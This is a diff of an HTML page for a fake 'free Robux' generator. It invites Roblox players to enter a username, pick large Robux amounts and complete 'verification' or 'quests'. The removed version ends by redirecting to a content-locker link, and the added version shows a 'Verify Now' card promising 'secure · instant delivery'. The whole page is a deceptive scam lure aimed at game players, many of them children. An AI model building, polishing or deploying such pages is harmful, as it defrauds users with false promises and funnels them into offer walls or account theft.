@@ -1,143 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Redeem</title>
-
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial,sans-serif;
-}
-
-body{
-    background:linear-gradient(-45deg,#12001f,#2d0050,#4b0082,#12001f);
-    background-size:400% 400%;
-    animation:bg 12s ease infinite;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    min-height:100vh;
-}
-
-@keyframes bg{
-0%{background-position:0% 50%;}
-50%{background-position:100% 50%;}
-100%{background-position:0% 50%;}
-}
-
-.container{
-    width:90%;
-    max-width:420px;
-    text-align:center;
-}
-
-.title{
-    color:#fff;
-    font-size:68px;
-    font-weight:bold;
-    text-shadow:0 0 20px #b42cff;
-    margin-bottom:15px;
-}
-
-.subtitle{
-    color:white;
-    font-size:22px;
-    margin-bottom:12px;
-}
-
-.stock{
-    display:inline-block;
-    background:#18c964;
-    color:white;
-    padding:8px 18px;
-    border-radius:999px;
-    font-weight:bold;
-    margin-bottom:30px;
-}
-
-input{
-    width:100%;
-    height:68px;
-    border-radius:18px;
-    border:2px solid white;
-    background:transparent;
-    color:white;
-    font-size:24px;
-    padding:0 20px;
-    outline:none;
-}
-
-input::placeholder{
-    color:#ddd;
-}
-
-button{
-    width:100%;
-    height:68px;
-    margin-top:25px;
-    border:none;
-    border-radius:18px;
-    background:linear-gradient(90deg,#7d2cff,#b42cff,#ff2ec7);
-    color:white;
-    font-size:26px;
-    font-weight:bold;
-    cursor:pointer;
-}
-
-button:hover{
-    opacity:.95;
-}
-
-.hidden{
-    display:none;
-}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Robux · Verify</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <!-- external style.css -->
+  <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
+  <div class="card" id="app">
+    <!-- username & platform -->
+    <div class="user-section">
+      <div class="label"><i class="fas fa-user-circle"></i> Please enter your username and select your platform.</div>
+      <div class="username-grid">
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+        <div class="username-item"><span>Your Username...</span> <i class="fas fa-chevron-down"></i></div>
+      </div>
+    </div>
 
-<div class="container" id="landingPage">
-    <h1 class="title">Redeem</h1>
+    <!-- amount selector -->
+    <div class="amount-section">
+      <div class="amount-header">
+        <span><i class="fas fa-coins" style="margin-right: 0.4rem; color: #f9c74f;"></i>Select the amount of Robux you want.</span>
+        <span class="selected-badge"><i class="fas fa-check-circle"></i> SELECTED AMOUNT <span id="selectedAmountDisplay">1700 Robux</span></span>
+      </div>
+      <div class="amount-options" id="amountOptions">
+        <div class="amount-btn active" data-amount="1700 Robux">1700 Robux</div>
+        <div class="amount-btn" data-amount="4500 Robux">4500 Robux</div>
+        <div class="amount-btn" data-amount="10000 Robux">10000 Robux</div>
+        <div class="amount-btn" data-amount="22500 Robux">22500 Robux</div>
+      </div>
+      <button class="proceed-btn" disabled><i class="fas fa-arrow-right"></i> Proceed</button>
+    </div>
 
-    <p class="subtitle">🚀 Enter your Roblox username</p>
+    <!-- verification required -->
+    <div class="verify-card">
+      <div class="verify-title">
+        <i class="fas fa-shield-alt"></i> Verification Required.
+      </div>
+      <div class="verify-sub">
+        Hello <strong>fdsf</strong>! You are almost done with adding <strong id="verifyAmountDisplay">1700 Robux</strong>!<br>
+        Please complete the verification by clicking the button below, and your robux will be added to your account.
+      </div>
 
-    <div class="stock">☁️ 27 Stock Remaining</div>
+      <div class="robux-badge">
+        <span class="big-amount" id="bigRobuxAmount">1700</span>
+        <span class="r-label">Robux</span>
+      </div>
 
-    <input type="text" id="username" placeholder="Username">
+      <div class="live-preview">
+        <span><i class="fas fa-circle" style="color: #5ddb6e; font-size: 0.6rem;"></i> YOUKERO LIVE PREVIEW</span>
+        <span class="badge">not purchased</span>
+      </div>
 
-    <button onclick="continuePage()">Continue</button>
-</div>
+      <button class="verify-now-btn" id="verifyNowBtn">
+        <i class="fas fa-check-circle"></i> Verify Now
+      </button>
+      <div class="footnote">
+        <i class="fas fa-lock" style="margin-right: 0.3rem;"></i> secure · instant delivery
+      </div>
+    </div>
+  </div>
 
-<div class="container hidden" id="nextPage">
-    <h1 class="title" style="font-size:42px;">⚠️ To verify:</h1>
-    <p class="subtitle">Must Complete 2 Quests.</p>
-    <button onclick="goNext()">Continue</button>
-</div>
-
-<script>
-function continuePage() {
-    const username = document.getElementById("username").value.trim();
-
-    if (!username) {
-        alert("🍬 Please enter your username.");
-        return;
-    }
-
-    localStorage.setItem("username", username);
-
-    document.getElementById("landingPage").classList.add("hidden");
-    document.getElementById("nextPage").classList.remove("hidden");
-}
-
-function goNext() {
-    // Replace with the appropriate next step for your site
-    window.location.href = "https://locked-content.com/?9ded58f";
-}
-</script>
-
+  <!-- external script.js -->
+  <script src="script.js"></script>
 </body>
 </html>
